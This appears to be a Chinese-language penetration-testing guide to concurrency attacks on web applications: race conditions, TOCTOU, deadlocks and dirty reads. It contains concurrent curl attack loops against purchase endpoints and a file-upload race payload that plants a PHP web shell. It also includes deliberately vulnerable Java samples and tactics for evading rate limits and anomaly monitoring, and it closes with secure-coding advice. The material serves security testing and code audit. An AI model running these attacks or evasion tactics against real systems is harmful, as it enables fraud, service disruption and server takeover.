# 并发异常攻击方法论文档

---

# 第一部分：文档概述

## 1.1 编写目的

阐述并发异常攻击的方法论，为测试人员提供一套标准化、可复现的并发异常漏洞测试与利用流程。帮助安全工程师发现并利用应用程序在高并发场景下异常处理的安全缺陷，包括竞态条件、TOCTOU 漏洞、死锁利用等攻击技术，确保测试的深度和广度，提高漏洞发现的准确率和效率。

## 1.2 适用范围

本文档适用于以下场景：
- 高并发 Web 应用和 API 服务
- 金融交易、电商秒杀等业务系统
- 存在共享资源访问的多线程应用
- 分布式系统和微服务架构

## 1.3 读者对象

- 执行渗透测试任务的安全工程师
- 安全分析师
- 负责代码审计的开发人员
- 系统架构师

---

# 第二部分：核心渗透技术专题

## 专题一：并发异常攻击

### 2.1 技术介绍

并发异常攻击是指攻击者利用应用程序在并发环境下的异常处理缺陷，通过精心设计的并发请求序列来触发：
- 竞态条件（Race Condition）
- TOCTOU（Time-of-Check to Time-of-Use）漏洞
- 死锁和资源饥饿
- 数据竞争和脏读
- 状态不一致

**漏洞本质：** 并发控制机制不完善，在多个请求同时访问共享资源时，异常处理未能保证数据一致性和操作原子性。

| 并发异常类型 | 描述 | 风险等级 |
|-------------|------|---------|
| 竞态条件 | 多个操作执行顺序影响结果 | 高 |
| TOCTOU | 检查和使用之间状态被改变 | 高 |
| 死锁 | 多个操作互相等待释放资源 | 中 |
| 数据竞争 | 多个线程同时读写共享数据 | 高 |
| 脏读 | 读取到未提交的数据 | 中 |

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 金融交易 | 转账、支付、提现 | 并发导致重复扣款或资金丢失 |
| 电商秒杀 | 限量商品抢购 | 超卖、库存不一致 |
| 票务系统 | 机票、电影票预订 | 重复出票、座位冲突 |
| 优惠券 | 优惠券领取和使用 | 超额领取、重复使用 |
| 账户管理 | 密码修改、资料更新 | 并发更新导致数据覆盖 |
| 文件操作 | 文件上传、删除 | 并发访问导致文件损坏 |
| 会话管理 | 多设备登录 | 会话状态不一致 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**并发探测技术：**

| 探测方法 | 操作说明 | 预期观察 |
|---------|---------|---------|
| 并发请求 | 同时发送多个相同请求 | 观察响应是否一致 |
| 时序控制 | 精确控制请求发送时间 | 触发竞态条件 |
| 资源竞争 | 并发访问同一资源 | 观察数据一致性 |
| 边界测试 | 在临界值附近并发操作 | 触发异常行为 |

**探测工具：**
```bash
# 使用 ab 进行并发测试
ab -n 1000 -c 100 https://target.com/api/seckill

# 使用 curl 并发
for i in {1..100}; do
  curl -X POST https://target.com/api/action &
done
wait

# 使用 Burp Suite Intruder
# 设置 Thread pool 为高并发数
```

**探测步骤：**
1. 识别并发敏感操作（如余额扣减、库存扣减）
2. 设计并发测试场景
3. 使用工具发送并发请求
4. 分析响应数据和最终状态
5. 检查是否存在不一致

#### 2.3.2 白盒测试

**代码审计检查点：**

```java
// 高危代码示例 1：非原子操作
public void transfer(Account from, Account to, int amount) {
    // 检查和扣款之间有竞态条件
    if (from.getBalance() >= amount) {
        from.setBalance(from.getBalance() - amount); // 非原子操作
        to.setBalance(to.getBalance() + amount);
    }
}

// 高危代码示例 2：TOCTOU 漏洞
public void withdraw(String accountId, int amount) {
    // Check
    int balance = getBalance(accountId);
    if (balance < amount) {
        throw new InsufficientFundsException();
    }
    // Time gap - 其他线程可能修改余额
    // Use
    setBalance(accountId, balance - amount); // 使用的是旧值！
}

// 高危代码示例 3：未加锁的共享状态
public class Counter {
    private int count = 0;
    
    public void increment() {
        count++; // 非线程安全，实际是 read-modify-write 三个操作
    }
}
```

**审计关键词：**
- `synchronized` - 检查是否正确使用
- `Lock` / `unlock` - 检查锁的获取和释放
- `AtomicXXX` - 原子类的使用
- `volatile` - 可见性保证
- `ThreadLocal` - 线程隔离

### 2.4 漏洞利用方法

#### 2.4.1 超卖攻击（库存竞态）

**利用场景：** 电商秒杀

```http
# 攻击脚本
#!/bin/bash
# 并发 100 个请求购买限量 1 件的商品
for i in {1..100}; do
  curl -X POST https://target.com/api/buy \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"productId": "LIMITED_001", "quantity": 1}' &
done
wait

# 预期结果：只有 1 个请求成功
# 实际结果：可能有多个请求成功，导致超卖
```

**利用原理：**
```
时间线：
T1: 请求 A 检查库存 = 1 ✓
T2: 请求 B 检查库存 = 1 ✓
T3: 请求 A 扣减库存 = 0
T4: 请求 B 扣减库存 = -1 (或也成功)
```

#### 2.4.2 重复支付攻击

**利用场景：** 支付系统

```
攻击步骤：
1. 准备两个并发请求，同时发起支付
2. 两个请求都通过余额检查
3. 两个请求都扣款成功
4. 商户收到两笔款项，用户只被扣一次款（或反之）
```

#### 2.4.3 TOCTOU 文件竞争攻击

**利用场景：** 文件上传

```
攻击步骤：
1. 上传一个合法文件 file.pdf
2. 服务器检查文件类型（合法）
3. 在检查后、保存前，快速替换文件内容
4. 恶意文件被保存

工具：使用符号链接或快速重命名
```

**Payload 示例：**
```bash
# 创建合法文件
echo "PDF content" > /tmp/upload

# 启动上传（在后台）
upload_script /tmp/upload &

# 快速替换为恶意文件
echo "<?php system($_GET['c']); ?>" > /tmp/upload

# 结果：恶意文件被保存
```

#### 2.4.4 死锁利用攻击

**利用场景：** 资源竞争

```
攻击步骤：
1. 分析系统的锁获取顺序
2. 构造请求序列，使不同请求以相反顺序获取锁
3. 触发死锁，导致服务不可用

示例：
请求 A: 获取锁 1 → 获取锁 2
请求 B: 获取锁 2 → 获取锁 1
结果：死锁
```

#### 2.4.5 脏读攻击

**利用场景：** 数据库事务隔离级别过低

```sql
-- 攻击场景
-- 攻击者事务 T1
BEGIN TRANSACTION;
SELECT balance FROM accounts WHERE id = 1; -- 读取未提交数据

-- 受害者事务 T2
BEGIN TRANSACTION;
UPDATE accounts SET balance = 0 WHERE id = 1;
ROLLBACK; -- 回滚

-- 攻击者读取到的是已回滚的脏数据
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过锁机制

**场景：** 系统有基本的锁保护

**绕过方法：**
```
1. 锁粒度分析：找到锁保护的盲区
2. 锁超时利用：等待锁超时后进入
3. 锁竞争：消耗锁持有者的资源
```

#### 2.5.2 绕过速率限制

**场景：** 系统有并发请求限制

**绕过方法：**
```
1. 分布式攻击：使用多个 IP/代理
2. 慢速并发：降低并发频率，延长攻击时间
3. 账户轮换：使用多个账户轮流攻击
```

#### 2.5.3 绕过异常监控

**场景：** 系统有并发异常检测

**绕过方法：**
```
1. 伪装正常：将攻击请求混合在正常流量中
2. 时间分散：在不同时间段发起攻击
3. 阈值探测：逐步增加并发数，找到检测阈值
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 类别 | Payload/方法 | 适用场景 | 说明 |
|-----|-------------|---------|------|
| 并发请求 | `ab -n 1000 -c 100` | 压力测试 | Apache Benchmark |
| 并发请求 | `for i in {1..N}; do curl & done` | Shell 并发 | 简单并发 |
| 竞态条件 | 同时提交相同优惠券 | 优惠券系统 | 重复使用 |
| TOCTOU | 上传后快速替换文件 | 文件上传 | 文件竞争 |
| 死锁 | 反向获取锁序列 | 资源管理 | 死锁触发 |

## 3.2 并发漏洞检测清单

| 检查项 | 检测方法 | 风险等级 |
|-------|---------|---------|
| 非原子操作 | 并发测试 + 数据一致性检查 | 高 |
| 缺少锁保护 | 代码审计 | 高 |
| 锁粒度太粗 | 性能分析 + 代码审计 | 中 |
| 锁顺序不一致 | 代码审计 | 中 |
| TOCTOU 模式 | 代码审计 + 时序测试 | 高 |
| 事务隔离级别 | 数据库配置检查 | 中 |

## 3.3 并发攻击工具

| 工具 | 用途 | 命令示例 |
|-----|------|---------|
| Apache Benchmark | HTTP 并发测试 | `ab -n 1000 -c 100 url` |
| wrk | HTTP 压力测试 | `wrk -t12 -c400 url` |
| JMeter | 并发场景测试 | GUI 配置并发线程组 |
| Burp Suite | 并发请求测试 | Intruder + 高线程数 |
| custom script | 精确时序控制 | Python threading/asyncio |

## 3.4 安全并发编程建议

```java
// 推荐的并发安全实现

// 1. 使用原子操作
AtomicInteger count = new AtomicInteger(0);
count.incrementAndGet();

// 2. 使用锁
private final Lock lock = new ReentrantLock();
public void safeOperation() {
    lock.lock();
    try {
        // 临界区操作
    } finally {
        lock.unlock(); // 确保释放
    }
}

// 3. 使用事务
@Transactional(isolation = Isolation.SERIALIZABLE)
public void transfer() {
    // 数据库操作
}

// 4. 使用并发集合
ConcurrentHashMap<String, Object> map = new ConcurrentHashMap<>();
```
